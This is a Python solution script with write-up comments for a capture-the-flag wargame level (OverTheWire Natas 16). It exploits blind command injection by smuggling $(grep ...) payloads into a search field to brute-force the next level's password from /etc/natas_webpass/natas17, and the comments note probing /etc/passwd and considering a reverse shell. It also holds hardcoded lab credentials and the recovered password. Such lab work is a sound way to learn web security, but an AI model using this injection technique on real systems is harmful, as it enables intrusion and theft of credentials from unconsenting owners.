#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'

#Custom Headers
custom_headers=''

lower='abcdefghijklmnopqrstuvwyxz'
upper=lower.upper()
digits='1234567890'
allchars=lower+upper+digits








# print(allchars)
# if true does not show anything
# if false shows output



#Checking for possible characters in /etc/natas_webpass/natas17
# possiblechars='' 
# for letter in allchars:
# 	print(f'\t[-] Trying {letter}\t\tcurrent:{possiblechars}')
# 	payload=f'$(grep {letter} /etc/natas_webpass/natas17)'
# 	path=f'/?needle={payload}&submit=Search'
# 	url=host+path
# 	session=requests.Session()
# 	response=requests.get(url,auth=(basic_username,basic_password))
# 	content=response.text
# 	if ('sonatas'in content): #Failed
# 		pass
# 	else:
# 		possiblechars+=letter
# 		print(f'[+] {possiblechars}')



# print(possiblechars)
possiblechars='8bcdghkmnqrswAGHNPQSW35790'


final=''
index=0
while (len(final)<40):
	letter=final+possiblechars[index]
	payload=f'$(grep ^{letter} /etc/natas_webpass/natas17)'
	print(f'[-] Trying {letter}\t\t\tcurrent : {final}\t\tpayload : {payload}')
	path=f'/?needle={payload}&submit=Search'
	url=host+path
	session=requests.Session()
	response=requests.get(url,auth=(basic_username,basic_password))
	content=response.text
	if ('sonatas' in content):#Failed
		#Got to the next letter
		index+=1
	else: #passed
		#Add the letter to the result
		final+=possiblechars[index]
		#reset the counter
		index=0










#Write up
# This time we get a form that uses grep to such for strings but this time the form rejects characters such as [ ; | & ` \ ' " ]
# We can enter commands in other commands using the method below
# $(othercommand)
# I realized that when a command is executed ,no output is displayed i.e
# Entering $(cat /etc/passwd) gives no output while $(cat /etc/fakefile) gives output ,meaning this is a blind attack
# First thing i thought of is checking for a reverseshell ,but single and double quotes are removed .I also tried $(curl --help) and $(netcat --help) 
# $(grep a filename) - Searches for a in the file and returns true if founf
# $(grep ^a filename) - Returns true if the first letter of the file is a
# We will use this boolean concept just like the previous one to iterate though a collection of symbols and alphanumerics till we get the password
# natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw0
